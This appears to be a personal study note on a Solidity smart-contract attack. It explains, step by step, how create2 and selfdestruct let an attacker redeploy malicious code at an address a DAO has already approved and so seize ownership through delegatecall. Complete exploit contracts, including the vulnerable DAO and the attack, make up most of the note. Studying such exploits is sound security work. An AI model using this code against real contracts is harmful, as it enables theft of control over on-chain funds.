#loss-of-access 

https://solidity-by-example.org/hacks/deploy-different-contracts-same-address/
https://www.youtube.com/watch?v=whjRc4H-rAc
[[Create and Create2]]
[[Self Destruct]]

This one is little complicated:
First attacker needs to deploy  `DeployerDeployer` and let it deploy `Deployer` using `create2`  (let's say at `0xFFF` )
`Deployer` then deploys a `Proposal` (at `0xABC`) using `create`
Get the DAO to approve the `Proposal`
Then attacker deletes the `Proposal` with `emergencyStop()`(which is in `0xABC`, also deletes `Deployer` (which is at `0xFFF`)
Then attacker can redeploy the `Deployer` using `DeployerDeployer` using create2 (at `0xFFF`)
Attacker now calls `Deployer.deployAttack()` to deploy `Attack` at the address of `0xABC` 
Reminded that `Deployer.deployAttack()` using `create`, how can it deploy the `Attack` under the same address?
It's because `address = last 20 bytes of sha3(rlp_encode(sender, nonce))`
If we can somehow reset the nonce, the address will be the same
Now the attacker can call the malicious code to gain owner access to the DAO

Normal situation:
![[Pasted image 20240714170133.png]]

Attack situation:
![[Pasted image 20240714170255.png]]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
Called by Alice
0. Deploy DAO

Called by Attacker
1. Deploy DeployerDeployer
2. Call DeployerDeployer.deploy()
3. Call Deployer.deployProposal()

Called by Alice
4. Get DAO approval of Proposal

Called by Attacker
5. Delete Proposal and Deployer
6. Re-deploy Deployer
7. Call Deployer.deployAttack()
8. Call DAO.execute
9. Check DAO.owner is attacker's address

DAO -- approved --> Proposal
DeployerDeployer -- create2 --> Deployer -- create --> Proposal
DeployerDeployer -- create2 --> Deployer -- create --> Attack
*/

contract DAO {
    struct Proposal {
        address target;
        bool approved;
        bool executed;
    }

    address public owner = msg.sender;
    Proposal[] public proposals;

    function approve(address target) external {
        require(msg.sender == owner, "not authorized");

        proposals.push(
            Proposal({target: target, approved: true, executed: false})
        );
    }

    function execute(uint256 proposalId) external payable {
        Proposal storage proposal = proposals[proposalId];
        require(proposal.approved, "not approved");
        require(!proposal.executed, "executed");

        proposal.executed = true;

        (bool ok,) = proposal.target.delegatecall(
            abi.encodeWithSignature("executeProposal()")
        );
        require(ok, "delegatecall failed");
    }
}

contract Proposal {
    event Log(string message);

    function executeProposal() external {
        emit Log("Excuted code approved by DAO");
    }

    function emergencyStop() external {
        selfdestruct(payable(address(0)));
    }
}

contract Attack {
    event Log(string message);

    address public owner;

    function executeProposal() external {
        emit Log("Excuted code not approved by DAO :)");
        // For example - set DAO's owner to attacker
        owner = msg.sender;
    }
}

contract DeployerDeployer {
    event Log(address addr);

    function deploy() external {
        bytes32 salt = keccak256(abi.encode(uint256(123)));
        address addr = address(new Deployer{salt: salt}());
        emit Log(addr);
    }
}

contract Deployer {
    event Log(address addr);

    function deployProposal() external {
        address addr = address(new Proposal());
        emit Log(addr);
    }

    function deployAttack() external {
        address addr = address(new Attack());
        emit Log(addr);
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}

```